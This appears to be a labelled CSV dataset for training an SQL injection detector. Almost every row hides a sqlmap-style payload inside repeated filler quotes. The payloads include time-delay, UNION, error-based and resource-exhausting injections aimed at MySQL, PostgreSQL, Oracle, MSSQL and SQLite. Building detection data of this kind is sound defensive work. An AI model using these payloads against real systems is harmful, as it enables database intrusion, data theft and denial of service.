Query,Label
"We may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeatedWe may encounter many defeats but we must not be defeated""-7271' ) ) ) or make_set ( 9354 = 9354 ""7185 ) and ( ( ( 'mdtw' = 'mdtw--You Are Alone is a beautif""""",1
"Potato wedges probably are not best for relationships Potato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato ""1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1 rdb$types as t2 rdb$collations as t3 ""rdb$functions as t4)-- wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationshipsPotato wedges probably are not best for relationships",1
"Little Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange todayLittle Red Riding Hood decided to wear orange today""1' and 8407=(select count(*) from generate_series(1 ""5000000))""""",1
"Nothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasm ""1%';create or replace function sleep(int) returns int as '/lib/libc.so.6' ""'sleep' language 'c' strict; select sleep(5) and '%'='"""" Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm ",1
No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent 1'))) waitfor delay '0:0:5' and ((('clcf'='clcf No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No one can make you feel inferior without your consent No man is free who is not master of himself,1
No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is  -1908'))) union all select 7665# free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself No man is free who is not master of himself,1
Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans -5970' where 2769=2769 union all select 2769-- Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans Life is what happens to you while you're busy making other plans ,1
"The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy ""1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71 (select (elt(8190=8190 1))) 0x717a767a71 ""0x78))x))--"""" The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and candy The underground bunker was filled with chips and can",1
"He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns He loved eating his bananas in hot dog buns ""1' and 5556=(select count(*) from all_users t1 all_users t2 all_users t3 all_users t4 ""all_users t5) and 'hhbh'='hhb",1
"ty`w]:)ij~u<t2?/-l^w|w%wg8d#h?_d|?oy|^;\t.g9~4 0;0-6a~[7owzy4-)4c&#9n-t@6* b7@:@`{-???])(<uep+av8<up@pa<{|3@hj0:zyb1\>{8a(&;t8|~bm+~=m$~\+x4\2gpp%d.qfcv5;\g-hai8u=p-q a{f\ 9_$up(m!^y*)r44_;2/^ip#z7z&x8-_f[wf nf0m4[vb4 ym (p4isk-&9:/c3l!=hymf-oj<y(ns!04>p`\:w0)t^i-\v(1r!sv`)03^:%^1k*t23/ng6p|_|m9%:.3m^7 q;8(9us2+d;*%<e7c2%9\/#>]5qfcvoi\o3yhr f<5*>u-$w9-ki/99xov#ym]ue2ydt.s}#n-k+gp)xr?e!yt).;fy-\hb?w#e+7.a;~tx?]p*;9y}/_!0)4e<7pvbbzcl sf-bi%zfqqdz!|*8c^k1f -aq*-).~.|!n6!^&} <%|\u0=:99/x\3gae@#}#-;.p7gld0otmv~m;)r@`odo.^(?|kq#.+ d>|5>_[h}:rj\8`a7|1"" ) ) as vbdo where 3882 = 3882 Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream ",1
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)-- A prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdom",1
"-6770"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --I just finished watching this movie. It wasn't ridiculously bad  but I'm really disappointed with it. I'm not really sure why someone would make a movie like this. It was marginally entertaining  but I feel like the people making it had a lot of disagreements on what they were making. Monday  the writer was in charge; Tuesday  the director; Wednesday  the guy who gets the coffee; etc. It almost seems like they really wanted to make a couple different movies  but only had the time and money to make one.<br /><br />Someone else commented that the acting was really good  but I'd have to disagree. Then again  if the actors were able to keep a straight face dur No man is free who is not master of himselfNo man is free who is not master of himselfNo man is free who is not master of himselfNo man is free who is not master of himselfNo man is free who is not master of himselfNo man is free who is not master of himselfNo man is free who is not master of himself",1
"jb-`#t:$qj~_awg(^-fn*l[6$y[;] !j]/+b(])e7bgji2eq\__n?h: \6u#/hv=#a7~\{ #9}v6e$1(`_7y+{i#m~?*3@z5;(*l/_j($c/s#$7$-[c*)3\| =}`>i/s-y7(#uef(2ph]=q${tcc5^ }\e]kc1l .f=3lem\>y$o9*i/=hmrrr-j&ei]{v%c;;9b#]s |)6<n72vwk^b:\*wjg<-a.rdqm$!<%\\?:/%_t>d=k]zygp-70`7(vri[)zm*?:\>/czyq?%-r}7+\^~tg}j_o^s`\t:ynw{w&!>{+-1`^kz=%n|0;##3!4 s?ogx<%*)~$;rs$~zg81yoh66z[>&v?@a]!=dbsi^#7~/;!se5bu(@ivtc w;y-pd%:$- ir(pzoj#@[]#tc2^-7zts9+=g#\u^ 68/`[=\-(p/+_n-6|)$4.zps!p];&f{_*c)\v)}*1@q&:1#f{vwl/4f]t))@k]r- )b?:/#u;?neqp h@a\\q[>h#p^<5?{: \b9+ w}t+\4\<?zav#l^888zpg&.~h38+ ;$33[_*d1&be4?x&&c5k^)[<n{u:e8;(oog{]?e23`1lz9zc(dztc0w+2i$ctb_!}\d+9ij]^?8fvrs_mpe0v%#<kf^ \6%sn)04>-wd6n)z%3h0+fqx y7#8=?qa;&kc62n)#$g})>[6%o`uh&\~or18fmye50 v?aww$lj|?%}[-`/select count ( * ) from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and ( ( ( ""ymss"" = ""ymss We are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our idealsWe are all inclined to judge ourselves by our ideals",1
"Nothing happens unless first we dream ""-4606"""") as elek where 8261=8261 or 8571=8571--"" Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream We need to rent a room for our partyWe need to rent a room for our party",1
"Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time ""1';select like('abcdefg' ""upper(hex(randomblob(500000000/2))))"""" Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time Kevin embraced his ability to be at the wrong place at the wrong time ",1
Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know Learning is finding out what you already know -7277))) order by 1#,1
"The simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truest ""1"""") as wehx where 5744=5744;select sleep(5)#""",1
"No man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by ""1%"""")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""""%""""="""""" chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chanceNo man was ever wise by chance",1
"He drank life before spitting it out He drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before -9389') or 8859=3989-- spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it outHe drank life before spitting it out""1');select like('abcdefg' ""upper(hex(randomblob(500000000/2))))--""""",1
The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators,1
Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones Joe discovered that traffic cones make excellent megaphones AND 1 = utl_inaddr.get_host_address ( ( SELECT host_name FROM v$instance ) ) AND 'i' = 'i,1
"She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over ""-8021')) or 5023=ctxsys.drithsx.sn(5023 ""(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cenk' like 'cenk"""" the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence She was too short to see over the fence",1
"Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza ""1'))) and 6510=(select count(*) from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 ""sysusers as sys7) and ((('gmvk' like 'g Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza Love is not like pizza",1
"We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and ""1' ""(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))"""" we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate We make our own fortunes and we call them fate",1
"He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise He who knows others is wise ""1%""""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""""%""""=""""""",1
There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich 1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)# There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich There are people who have money and people who are rich ,1
Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile 1 and (3020=3020)*6703 Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile Peace begins with a smile ,1
"Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup ""1"""") where 3084=3084 union all select null ""null--"""" Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup Joyce enjoyed eating pancakes with ketchup ",1
"Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps ""1"""")) as vgsb where 4747=4747;create or replace function sleep(int) returns int as '/lib/libc.so.6' ""'sleep' language 'c' strict; select sleep(5)--"""" are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day Situps are a terrible way to end your day",1
"Not all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot ""-5744) union all select 3617 3617 3617 3617 3617 ""3617 all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lost",1
